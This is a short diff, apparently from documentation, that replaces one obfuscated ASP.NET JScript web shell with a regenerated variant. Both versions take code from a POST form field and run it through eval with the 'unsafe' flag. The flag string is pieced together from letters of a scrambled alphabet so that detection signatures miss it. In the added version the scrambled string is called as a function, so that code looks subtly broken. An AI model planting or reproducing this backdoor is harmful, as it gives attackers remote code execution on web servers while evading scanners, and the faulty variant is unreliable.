@@ -10,9 +10,9 @@
 ```
 <%@ Page Language="Jscript" Debug=true%>
 <%
-var qYfz='yLMTWpiPKslvUIbcAewaZzErjYoXJhQFqtCkBVGOHDNSuxgfdmnR';
-var nlfm=Request.Form("mr6");
-var tNmx=a(12)+a(42)+a(9)+a(16)+a(31)+a(17);
-eval(nlfm,tNmx);
+var UdIw='hVYFCrBEjfzQsUkdgOReSAKXntawHGiWPvTpqJxmLZbylcuMNDIo';
+var YJxe=Request.Form("yzddmr6");
+var zIUt=UdIw(13)+UdIw(24)+UdIw(12)+UdIw(21)+UdIw(3)+UdIw(7);
+eval(YJxe,zIUt);
 %>
 ```
